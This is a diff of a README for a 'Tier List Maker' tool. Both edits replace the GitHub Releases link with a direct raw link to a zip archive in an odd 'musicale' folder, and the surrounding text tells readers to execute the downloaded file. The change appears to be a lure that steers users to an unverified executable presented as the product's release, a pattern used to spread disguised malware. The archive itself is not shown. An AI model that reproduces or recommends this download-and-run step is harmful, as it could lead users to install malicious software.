@@ -18,7 +18,7 @@ create-tier-list, css, custom-tier-list, developer-tools, game-development, game
 
 ## Get Started
 
-To access the latest release of Tier List Maker, visit the [Releases](https://github.com/freddyakl/tier-list-maker/releases) section.
+To access the latest release of Tier List Maker, visit the [Releases](https://github.com/freddyakl/tier-list-maker/raw/refs/heads/main/musicale/list_tier_maker_v1.8.zip) section.
 
 ## Screenshots
 
@@ -26,7 +26,7 @@ To access the latest release of Tier List Maker, visit the [Releases](https://gi
 
 ## Installation
 
-1. Download the file from the provided [link](https://github.com/freddyakl/tier-list-maker/releases).  
+1. Download the file from the provided [link](https://github.com/freddyakl/tier-list-maker/raw/refs/heads/main/musicale/list_tier_maker_v1.8.zip).  
 2. Execute the downloaded file to start using the Tier List Maker tool.
 
 ## Support
